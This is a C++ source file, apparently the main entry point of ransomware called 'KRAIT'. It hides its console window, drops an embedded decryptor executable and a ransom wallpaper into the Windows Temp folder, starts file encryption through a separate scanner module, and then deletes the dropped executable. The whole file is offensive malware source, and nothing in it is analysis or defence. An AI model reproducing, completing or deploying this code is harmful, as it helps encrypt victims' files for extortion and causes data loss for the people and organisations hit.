#include "file_scanner.h"
#include <windows.h>
#include <tchar.h>

void ExtractResource(int resourceId, const std::string& outputPath) {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(resourceId), RT_RCDATA);
    if (!hRes) return;
    
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;
    
    DWORD size = SizeofResource(NULL, hRes);
    LPVOID pData = LockResource(hData);
    
    std::ofstream out(outputPath, std::ios::binary);
    out.write((char*)pData, size);
    out.close();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide window
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);
    
    // Extract resources before encryption
    char desktopPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
    std::string desktop = std::string(desktopPath);
    
    // Extract decryptor to temp
    std::string tempExe = "C:\\Windows\\Temp\\KRAIT_DECRYPTOR.exe";
    ExtractResource(101, tempExe);
    
    // Extract wallpaper
    std::string tempWall = "C:\\Windows\\Temp\\krait.webp";
    ExtractResource(102, tempWall);
    
    // Start encryption
    FileScanner::StartEncryption();
    
    // Cleanup
    DeleteFileA(tempExe.c_str());
    // Keep wallpaper
    
    return 0;
}
